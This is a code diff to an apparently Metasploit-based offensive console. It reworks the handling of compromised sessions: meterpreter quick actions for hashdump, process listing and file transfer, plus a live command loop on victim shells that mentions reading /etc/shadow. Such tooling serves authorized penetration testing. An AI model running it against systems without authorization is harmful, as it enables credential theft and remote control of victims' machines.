@@ -814,6 +814,48 @@ class MetasploitRPCEngine:
         console.print(table)
         return True
 
+    def _drain_shell(self, shell, timeout=8.0, min_wait=0.3):
+        """
+        Reliably drain a raw shell's output buffer.
+        Polls in tight loop until `timeout` seconds of silence, 
+        always waiting at least `min_wait` for the first chunk.
+        Returns the full output string.
+        """
+        output = ""
+        deadline = time.time() + timeout
+        # Always give the remote side a moment to start responding
+        time.sleep(min_wait)
+        while time.time() < deadline:
+            try:
+                chunk = shell.read()
+            except Exception:
+                break
+            if chunk:
+                output += chunk
+                # Reset deadline — more data may still be coming
+                deadline = time.time() + 2.0
+            else:
+                time.sleep(0.15)
+        return output
+
+    def _run_meterpreter_cmd(self, shell, cmd, timeout=15):
+        """
+        Run a meterpreter command and return output.
+        Falls back gracefully if run_with_output raises or returns None.
+        """
+        try:
+            result = shell.run_with_output(cmd, timeout=timeout)
+            return result if result else "(no output)"
+        except TypeError:
+            # Older pymetasploit3 doesn't accept timeout kwarg
+            try:
+                result = shell.run_with_output(cmd)
+                return result if result else "(no output)"
+            except Exception as e:
+                return f"[error: {e}]"
+        except Exception as e:
+            return f"[error: {e}]"
+
     def interact_session(self):
         if not self.list_sessions():
             return
@@ -833,11 +875,12 @@ class MetasploitRPCEngine:
         session_type = sessions[session_id].get('type', 'Unknown')
         shell = self.client.sessions.session(session_id)
 
+        # ── Meterpreter: quick-action menu before dropping to interactive ────
         if session_type == 'meterpreter':
             quick_action = questionary.select(
                 "Meterpreter Quick Actions:",
                 choices=[
-                    "1. Drop into Interactive Shell",
+                    "1. Drop into Interactive Shell (recommended)",
                     "2. Run 'sysinfo' and 'getuid'",
                     "3. Attempt Hashdump",
                     "4. List Running Processes (ps)",
@@ -849,65 +892,128 @@ class MetasploitRPCEngine:
 
             if quick_action and "sysinfo" in quick_action:
                 console.print("[cyan][*] Gathering system info...[/cyan]")
-                console.print(shell.run_with_output('sysinfo'))
-                console.print(shell.run_with_output('getuid'))
-            elif quick_action and "Hashdump" in quick_action:
                 console.print(
-                    "[cyan][*] Attempting hashdump...[/cyan]")
-                console.print(shell.run_with_output('hashdump'))
+                    f"[white]{self._run_meterpreter_cmd(shell, 'sysinfo')}[/white]")
+                console.print(
+                    f"[white]{self._run_meterpreter_cmd(shell, 'getuid')}[/white]")
+                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+                return
+            elif quick_action and "Hashdump" in quick_action:
+                console.print("[cyan][*] Attempting hashdump...[/cyan]")
+                console.print(
+                    f"[white]{self._run_meterpreter_cmd(shell, 'hashdump', timeout=30)}[/white]")
+                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+                return
             elif quick_action and "ps" in quick_action:
-                console.print(shell.run_with_output('ps'))
+                console.print(
+                    f"[white]{self._run_meterpreter_cmd(shell, 'ps')}[/white]")
+                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+                return
             elif quick_action and "Upload" in quick_action:
                 local_path = questionary.text(
-                    "Local file path to upload:", style=Q_STYLE).ask()
+                    "Local file path:", style=Q_STYLE).ask()
                 remote_path = questionary.text(
-                    "Remote destination path:", style=Q_STYLE).ask()
+                    "Remote destination:", style=Q_STYLE).ask()
                 if local_path and remote_path:
                     console.print(
-                        shell.run_with_output(f'upload {local_path} {remote_path}'))
+                        f"[white]{self._run_meterpreter_cmd(shell, f'upload {local_path} {remote_path}', timeout=60)}[/white]")
+                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+                return
             elif quick_action and "Download" in quick_action:
                 remote_path = questionary.text(
-                    "Remote file path to download:", style=Q_STYLE).ask()
+                    "Remote file path:", style=Q_STYLE).ask()
                 local_path = questionary.text(
-                    "Local destination path:", style=Q_STYLE).ask()
+                    "Local destination:", style=Q_STYLE).ask()
                 if remote_path and local_path:
                     console.print(
-                        shell.run_with_output(f'download {remote_path} {local_path}'))
+                        f"[white]{self._run_meterpreter_cmd(shell, f'download {remote_path} {local_path}', timeout=60)}[/white]")
+                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+                return
+            # Falls through to interactive shell for option 1
 
+        # ── Interactive shell header ──────────────────────────────────────────
+        prompt_label = "meterpreter" if session_type == "meterpreter" else "shell"
         console.print(Panel(
-            f"[bold green][+] Interacting with {session_type.capitalize()} "
-            f"Session {session_id}[/bold green]\n"
-            "[dim]Type 'exit', 'quit', or 'background' to return.[/dim]",
+            f"[bold green][+] Interactive {session_type.capitalize()} — Session {session_id}[/bold green]\n"
+            f"[dim]Target: {sessions[session_id].get('target_host', '?')} | "
+            f"Info: {sessions[session_id].get('info', 'N/A')}[/dim]\n"
+            "[dim cyan]Commands are sent live to the victim. "
+            "Type [bold]exit[/bold], [bold]quit[/bold], or [bold]background[/bold] to return.[/dim cyan]",
             border_style="green"
         ))
 
+        # ── For raw shells: send a newline first to get an initial prompt ─────
+        if session_type != 'meterpreter':
+            try:
+                shell.write('\n')
+                initial = self._drain_shell(shell, timeout=3.0, min_wait=0.5)
+                if initial.strip():
+                    console.print(
+                        f"[bright_green]{initial}[/bright_green]", end="")
+            except Exception:
+                pass
+
+        # ── Main interactive REPL ─────────────────────────────────────────────
         while True:
             try:
-                cmd = questionary.text(
-                    f"{session_type.capitalize()} {session_id} >",
-                    style=Q_STYLE
-                ).ask()
+                # Use plain input() so the terminal behaves naturally.
+                # questionary adds extra chrome that breaks multi-line output display.
+                try:
+                    cmd = input(
+                        f"\033[1;36m{prompt_label} ({session_id}) > \033[0m")
+                except EOFError:
+                    break
+
+                cmd = cmd.strip()
                 if not cmd:
                     continue
                 if cmd.lower() in ['exit', 'quit', 'background']:
+                    console.print(
+                        "[yellow][*] Backgrounding session...[/yellow]")
                     break
+
+                # ── Meterpreter path ──────────────────────────────────────────
                 if session_type == 'meterpreter':
-                    output = shell.run_with_output(cmd)
+                    output = self._run_meterpreter_cmd(shell, cmd)
                     if output:
                         console.print(f"[white]{output}[/white]")
+
+                # ── Raw shell path (cmd/unix/interact, cmd shell, etc.) ───────
                 else:
                     shell.write(cmd + '\n')
-                    time.sleep(1.5)
-                    output = shell.read()
-                    if output:
-                        console.print(f"[white]{output}[/white]")
+
+                    # Adaptive timeout: some commands (find, cat /etc/shadow) take longer
+                    slow_cmds = ['find', 'locate', 'grep', 'cat', 'ls', 'ps',
+                                 'netstat', 'ss', 'ifconfig', 'ip ', 'id',
+                                 'uname', 'whoami', 'pwd', 'env', 'export',
+                                 'history', 'sudo', 'chmod', 'chown']
+                    timeout = 12.0 if any(c in cmd for c in slow_cmds) else 6.0
+
+                    output = self._drain_shell(
+                        shell, timeout=timeout, min_wait=0.3)
+
+                    if output.strip():
+                        # Print with green tint so victim output is visually distinct
+                        console.print(
+                            f"[bright_green]{output}[/bright_green]", end="")
+                        # Ensure we always end on a new line
+                        if not output.endswith('\n'):
+                            print()
+                    else:
+                        console.print(
+                            "[dim](no output — command may have run silently)[/dim]")
+
             except KeyboardInterrupt:
                 console.print(
-                    "\n[yellow][*] Backgrounding session...[/yellow]")
-                break
+                    "\n[yellow][*] Ctrl+C caught — use 'background' to return to menu.[/yellow]")
+                # Send Ctrl+C to the remote shell too, in case it's stuck
+                try:
+                    shell.write('\x03')
+                except Exception:
+                    pass
+                continue
             except Exception as e:
-                console.print(
-                    f"[bold red][!] Session error:[/bold red] {e}")
+                console.print(f"[bold red][!] Session error:[/bold red] {e}")
                 break
 
     # ── Jobs ─────────────────────────────────────────────────────────────────
